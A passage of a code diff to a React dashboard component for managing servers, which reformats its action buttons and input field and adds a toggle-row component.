-              <span className="w-1.5 h-1.5 rounded-full bg-[#00ff9d] shadow-[0_0_4px_#00ff9d] animate-pulse" />
-              {status}
+              <span className="w-1.5 h-1.5 rounded-full bg-[#00ff9d] shadow-[0_0_4px_#00ff9d] animate-pulse" />{status}
             </span>
             <div className="flex-1" />
             <div className="flex items-center gap-1 shrink-0">
-              <ActionBtn icon={Play}   tip="Play"   id={`play-${name}`} />
-              <ActionBtn icon={Pause}  tip="Pause"  id={`pause-${name}`} />
-              <ActionBtn icon={Box}    tip="Box"    id={`box-${name}`} />
-              <ActionBtn icon={Pencil} tip="Editar" id={`edit-${name}`} />
+              <ActionBtn icon={Play}   tip="Play"    id={`play-${name}`} />
+              <ActionBtn icon={Pause}  tip="Pause"   id={`pause-${name}`} />
+              <ActionBtn icon={Box}    tip="Box"     id={`box-${name}`} />
+              <ActionBtn icon={Pencil} tip="Editar"  id={`edit-${name}`} />
               <ActionBtn icon={Trash2} tip="Excluir" id={`del-${name}`} danger />
             </div>
           </div>
@@ -468,14 +513,10 @@ function ServerCard({ abbr, name, ip, status, email, tag, added, stats }: {
 
 function ActionBtn({ icon: Icon, tip, id, danger }: { icon: React.ElementType; tip: string; id: string; danger?: boolean }) {
   return (
-    <button
-      title={tip}
-      data-testid={`btn-${id}`}
+    <button title={tip} data-testid={`btn-${id}`}
       className={`w-7 h-7 rounded border flex items-center justify-center transition-all
-        ${danger
-          ? "border-destructive/25 text-destructive/70 hover:bg-destructive/15 hover:border-destructive/50 hover:text-destructive"
-          : "border-primary/20 text-primary/60 hover:bg-primary/15 hover:border-primary/50 hover:text-primary hover:shadow-[0_0_6px_rgba(0,212,255,0.25)]"}`}
-    >
+        ${danger ? "border-destructive/25 text-destructive/70 hover:bg-destructive/15 hover:border-destructive/50 hover:text-destructive"
+        : "border-primary/20 text-primary/60 hover:bg-primary/15 hover:border-primary/50 hover:text-primary hover:shadow-[0_0_6px_rgba(0,212,255,0.25)]"}`}>
       <Icon className="w-3.5 h-3.5" />
     </button>
   );
@@ -493,7 +534,25 @@ function StatBlock({ icon: Icon, label, value, green }: { icon: React.ElementTyp
   );
 }
 
-/* ── Generic field ── */
+function ToggleRow({ emoji, label, checked, onChange, testId }: {
+  emoji: string; label: string; checked: boolean; onChange: () => void; testId: string;
+}) {
+  return (
+    <button type="button" onClick={onChange} data-testid={testId}
+      className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg border transition-all text-left
+        ${checked
+          ? "border-primary/50 bg-primary/10 shadow-[0_0_8px_rgba(0,212,255,0.08)]"
+          : "border-white/5 bg-[#0b0f1a] hover:border-primary/25 hover:bg-primary/5"}`}>
+      <span className="text-base leading-none shrink-0">{emoji}</span>
+      <span className={`flex-1 text-xs font-medium transition-colors ${checked ? "text-primary" : "text-foreground/70"}`}>{label}</span>
+      <div className={`w-9 h-5 rounded-full border transition-all flex items-center px-0.5 shrink-0
+        ${checked ? "bg-primary border-primary justify-end" : "bg-[#0b0f1a] border-primary/25 justify-start"}`}>
+        <div className={`w-4 h-4 rounded-full shadow transition-all ${checked ? "bg-[#0b0f1a]" : "bg-primary/30"}`} />
+      </div>
+    </button>
+  );
+}
+
 function Field({ label, placeholder, value, onChange, testId, icon, required }: {
   label: string; placeholder: string; value: string;
   onChange: (v: string) => void; testId: string;
@@ -501,19 +560,13 @@ function Field({ label, placeholder, value, onChange, testId, icon, required }: 
 }) {
   return (
     <div>
-      <Label className="text-[10px] uppercase tracking-widest text-muted-foreground mb-1.5 flex items-center gap-1">
+      <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">
         {label} {required && <span className="text-destructive">*</span>}
-      </Label>
+      </p>
       <div className="relative">
         {icon && <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground/50">{icon}</span>}
-        <Input
-          value={value}
-          onChange={e => onChange(e.target.value)}
-          placeholder={placeholder}
-          required={required}
-          data-testid={testId}
-          className={`bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs placeholder:text-muted-foreground/40 h-8 ${icon ? "pl-7" : ""}`}
-        />
+        <Input value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder} required={required} data-testid={testId}
+          className={`bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs placeholder:text-muted-foreground/40 h-8 ${icon ? "pl-7" : ""}`} />
       </div>
     </div>
   );
